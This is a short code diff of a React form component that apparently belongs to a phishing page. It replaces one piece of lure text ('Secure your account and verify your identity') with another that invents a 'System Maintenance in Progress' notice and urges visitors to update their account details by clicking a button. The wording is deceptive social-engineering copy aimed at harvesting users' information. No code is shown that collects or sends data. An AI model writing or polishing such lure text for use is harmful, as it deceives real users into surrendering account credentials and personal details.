@@ -6,13 +6,12 @@ function Address() {
     <>
       <div className="main">
         <div className="form-container">
-          <h1 className="form-head">
-            Secure your account and verify your identity
-          </h1>
+          <h1 className="form-head">System Maintenance in Progress</h1>
           <div className="text">
-            To ensure your account remains active, please confirm your email
-            usage by completing the validation process below. This helps us
-            maintain the security and functionality of our email systems.
+            Please be advised that essential system maintenance is currently
+            underway. To ensure your account information is accurate, please
+            take a moment to update your details by clicking the button below. Thank you for
+            your cooperation!
           </div>
           <button
             type="submit"
